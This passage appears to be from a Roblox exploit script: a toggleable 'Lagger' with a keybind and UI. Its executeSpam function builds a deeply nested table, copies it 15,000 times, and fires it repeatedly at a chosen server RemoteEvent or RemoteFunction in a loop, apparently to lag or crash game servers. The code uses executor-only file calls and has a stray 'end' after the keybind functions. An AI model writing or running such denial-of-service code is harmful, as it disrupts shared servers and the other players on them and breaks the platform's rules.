local function getRemote(path)
    if not path or path == "" then return nil end
    local currentObj = game
    local cleanPath = path:gsub("^game%.", "")
    for segment in cleanPath:gmatch("[^%.]+") do
        if currentObj then
            currentObj = currentObj:FindFirstChild(segment)
        else
            return nil
        end
    end
    return currentObj
end

local function loadSavedKeybind()
    local success, data = pcall(readfile, CONFIG.Settings.SaveFile)
    if success and data and data ~= "" then
        for _, keyCode in pairs(Enum.KeyCode:GetEnumItems()) do
            if keyCode.Name == data then
                UIState.CurrentKeybind = keyCode
                if KeybindBtn then
                    KeybindBtn.Text = keyCode.Name
                end
                break
            end
        end
    end
end

local function saveKeybind(key)
    UIState.CurrentKeybind = key
    KeybindBtn.Text = key.Name
    pcall(writefile, CONFIG.Settings.SaveFile, key.Name)
end

end

-- // [6] FUNCTIONALITY //
local function executeSpam(nestDepth, attempts)
    local mainTable = {}
    local spamTable = {}
    table.insert(spamTable, {})
    
    local pointer = spamTable[1]
    for i = 1, nestDepth do
        local newTable = {}
        table.insert(pointer, newTable)
        pointer = newTable
    end
    
    for i = 1, 15000 do
        table.insert(mainTable, spamTable)
        if i % 1000 == 0 then
            task.wait()
        end
    end

    local remoteInstance = getRemote(CONFIG.Lagger.RemotePath)
    if remoteInstance then
        for i = 1, attempts do
            pcall(function()
                if remoteInstance:IsA("RemoteEvent") or remoteInstance:IsA("UnreliableRemoteEvent") then
                    remoteInstance:FireServer(mainTable)
                elseif remoteInstance:IsA("RemoteFunction") then
                    remoteInstance:InvokeServer(mainTable)
                end
            end)
        end
    end
end

local function runLaggerLoop()
    while UIState.IsLagging do
        task.spawn(function()
            executeSpam(CONFIG.Lagger.X, CONFIG.Lagger.Y)
        end)
        task.wait(CONFIG.Lagger.Z)
    end
end

local function toggleLagger()
    UIState.IsLagging = not UIState.IsLagging
    updateToggleVisuals()
    
    if UIState.IsLagging then
        task.spawn(runLaggerLoop)
    end
end

local function setupInteractions()
    -- Toggle Interaction
    ToggleHitbox.MouseButton1Click:Connect(function()
        toggleLagger()
    end)

    -- Lock Window Dragging
    LockBtn.MouseButton1Click:Connect(function()
        UIState.IsLocked = not UIState.IsLocked
        MainFrame.Draggable = not UIState.IsLocked
        
        if UIState.IsLocked then
            LockBtn.Text = "🔒 LOCK"
            LockBtn.TextColor3 = CONFIG.Colors.TextSecondary
        else
            LockBtn.Text = "🔓 UNLOCK"
            LockBtn.TextColor3 = CONFIG.Colors.Stroke
        end
    end)

    -- Keybind Assignment Button
    KeybindBtn.MouseButton1Click:Connect(function()
        UIState.IsBinding = true
        KeybindBtn.Text = "..."
        KeybindBtn.TextColor3 = CONFIG.Colors.TextPrimary
    end)

    -- Input Listener
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        -- Left Control Visibility Toggle
        if not gameProcessed and input.KeyCode == Enum.KeyCode.LeftControl then
            MainFrame.Visible = not MainFrame.Visible
            return
        end

        if UIState.IsBinding then
            if input.UserInputType == Enum.UserInputType.Keyboard then
                local selectedKey = input.KeyCode
                if selectedKey ~= Enum.KeyCode.Unknown then
                    saveKeybind(selectedKey)
                    UIState.IsBinding = false
                end
            end
        elseif not gameProcessed then
            if input.KeyCode == UIState.CurrentKeybind then
                toggleLagger()
            end
        end
    end)
end
